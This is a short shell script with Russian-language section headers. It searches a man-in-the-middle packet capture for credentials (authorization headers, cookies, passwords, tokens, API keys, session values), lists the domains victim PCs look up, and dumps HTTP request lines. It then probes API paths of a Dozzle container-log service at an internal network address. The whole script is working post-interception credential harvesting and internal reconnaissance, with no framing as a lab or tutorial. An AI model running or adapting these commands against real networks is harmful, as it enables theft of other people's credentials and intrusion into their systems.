echo "=== MITM PCAP: ВСЕ СТРОКИ ==="
apt-get install -y tcpdump >/dev/null 2>&1
tcpdump -r /tmp/mitm3.pcap -A -c 500 2>/dev/null | grep -aiE "authoriz|cookie|pass|login|user|token|basic|bearer|api.key|secret|session" | sort -u | head -30
echo "=== MITM: DNS запросы (куда ходят ПК) ==="
tcpdump -r /tmp/mitm3.pcap -c 100 2>/dev/null | grep -a "A?" | grep -oE "A\? [^ ]*" | sort | uniq -c | sort -rn | head -20
echo "=== MITM: HTTP POST тела ==="
tcpdump -r /tmp/mitm3.pcap -A -c 500 2>/dev/null | grep -aE "POST|GET|HTTP" | head -15
echo "=== DOZZLE правильные пути ==="
for p in "/api/containers" "/api/hosts" "/api/docs" "/api/swagger" "/health" "/api/health"; do
  C=$(timeout 4 wget -q -T 3 -O /dev/null -w "%{http_code}" "http://192.168.3.121:8080$p" 2>/dev/null)
  echo "$p → $C"
done
